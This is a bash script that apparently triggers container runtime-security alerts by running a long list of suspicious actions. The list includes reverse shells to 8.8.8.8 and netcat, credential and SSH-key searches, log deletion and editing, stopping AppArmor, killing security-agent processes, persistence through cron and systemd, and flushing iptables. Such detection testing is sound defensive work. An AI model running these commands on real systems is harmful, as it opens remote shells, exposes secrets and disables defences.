#!/bin/bash

apt update
apt install -y net-tools wget curl netcat-openbsd python3 rsync masscan docker-ce strace sudo git python3 pip pipx
cd /tmp
echo "#I was here" | tee -a /etc/profile
sleep 5
touch /etc/apt/sources.list.d/testfile
sleep 5
cat /root/.ssh/authorized_keys
sleep 5
apt install -y apache2 php curl; echo -e "<?php\nreadfile(\"/etc/pam.conf\");\nreadfile(\"/../../../etc/pam.conf\");\n?>" > /var/www/html/TMV1CS; mv /var/www/html/TMV1CS /var/www/html/TMV1CS.php; service apache2 start; curl http://127.0.0.1/TMV1CS.php
sleep 5
/bin/bash -i >& /dev/tcp/8.8.8.8/443 0>&1
sleep 5
wget 169.254.169.254
sleep 5
nc -e /bin/bash 127.0.0.1 9999
sleep 5
cp /var/log/apt/term.log /var/log/apt/term.log.bkup; rm /var/log/apt/term.log
sleep 5
ln -s / woot
sleep 5
python3 -c "import socket; s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW); print('Raw socket created successfully:', s)"
sleep 5
/bin/bash -i >& /dev/tcp/8.8.8.8/443 0>&1 & sleep 1
sleep 5
dpkg --configure -a; apt update; apt install -y kmod; insmod --v
sleep 5
rsync
sleep 5
masscan
sleep 5
curl http://rraannddoommtestdomainn.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64
sleep 5
service apparmor stop
sleep 5
docker ps
sleep 5
sysctl /vm/nr_hugepages
sleep 5
curl -X POST -F 'username=trend' stratum+tcp://stratum.fakepool.rraannddoommtestdomainn.com:3333
sleep 5
touch /etc/cron.daily/testfile
sleep 5
touch /etc/ld.so.preload
sleep 5
apt-get -yq install mysql-server; service mysql start; mysql -Bse "system cat /etc/passwd"
sleep 5
ssh -o BatchMode=yes -o StrictHostKeyChecking=no root@rraannddoomm.tteesstt 'whoami'
sleep 5
pkill cryptonight
sleep 5
cp /root/.bash_history /root/bash_history.bkup
sleep 5
echo 'Hi rrrr' > testfile; chattr -i testfile
sleep 5
touch testfile0; chmod u+s testfile0
sleep 5
rm -rf /tmp/*
sleep 5
curl --max-time 1 -I irc.efnet.net:6667
sleep 5
curl http://rraannddoommtestdomainn.com/brompwnie/botb
sleep 5
curl http://rraannddoommtestdomainn.com/peirates
sleep 5
python3 -c "import http.client; conn = http.client.HTTPConnection('example.com'); conn.request('GET', '/'); print(conn.getresponse().read().decode()); conn.close()"
sleep 5
find / -name id_rsa.pub
sleep 5
ps aux | grep 'Yun\|aegis' | awk '{print $2}' | xargs -I % kill -9 %
sleep 5
sed -i s/something critical happened/nothing to see here/g /var/log/dpkg.log
sleep 5
nsenter -t 1 -n unshare -n sh
sleep 5
wget https://www.rraannddoommtestdomainn.com
sleep 5
echo 'echo "Hi"' >/dev/shm/script.sh; /bin/bash /dev/shm/script.sh
sleep 5
find / -name "*.aws/credentials"
sleep 5
strace id
sleep 5
mkdir .hidden_directory
sleep 5
mkdir /bin/testtdirr
sleep 5
touch /bin/testfile && mv /bin/testfile /bin/testtdirr
sleep 5
mkdir /var/lib/rpm; touch /var/lib/rpm/testfile0
sleep 5
prlimit --nproc=1000 pid=1
sleep 5
useradd testuser2
sleep 5
userdel testuser2
sleep 5
echo "# Hello" > /etc/selinux/config; sed -i 's/oldstring/newstring/' /etc/selinux/config
sleep 5
echo "'Task executed' >> /tmp/somerraannddoommlloogg.log" | at now + 1 minute
sleep 5
echo -e "[Unit]\n[Service]\nExecStart=/tmp/script.sh" | tee /etc/systemd/system/my-task.service && echo -e "[Unit]\n[Timer]\nOnCalendar=*-*-* *:*:00" | tee /etc/systemd/system/my-task.timer && sudo systemctl enable --now my-task.timer
sleep 5
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
sleep 5
python3 -c "import urllib.request; response = urllib.request.urlopen('http://www.tteessttddiirrr.com'); print(response.read())"
sleep 5
pipx install fee; pipx ensurepath; export PATH=\"$PATH:/root/.local/bin\"; source ~/.bashrc; fee /usr/bin/ls > output.py; python3 output.py
sleep 5
git clone https://github.com/arget13/DDexec.git; cd DDexec; base64 -w0 /bin/ls | bash ddexec.sh ls -lA; SEEKER=cmp bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)
sleep 5
touch /root/.bash_history
grep -E '^(ssh|scp|rsync) ' "/root/.bash_history" 2>/dev/null | sort | uniq
sleep 5
apt install -y g++; echo 'I2luY2x1ZGUgPGlvc3RyZWFtPgojaW5jbHVkZSA8ZnN0cmVhbT4KdXNpbmcgbmFtZXNwYWNlIHN0ZDsKCmludCBtYWluKCkgewoJc3RyaW5nIHRlc3Q7CglpZnN0cmVhbSBSZWFkRmlsZSgibGlibHptYS5zby41LjYuMCIpOwoKCXdoaWxlIChnZXRsaW5lKFJlYWRGaWxlLCB0ZXN0KSkgewoJCWNvdXQgPDwgdGVzdDsKCX0KCglSZWFkRmlsZS5jbG9zZSgpOwoJcmV0dXJuIDA7Cn0K' | base64 -d > trigger.cpp; g++ trigger.cpp -o sshd; echo 'rraannddoomm' > liblzma.so.5.6.0; ./sshd
sleep 5
iptables -F
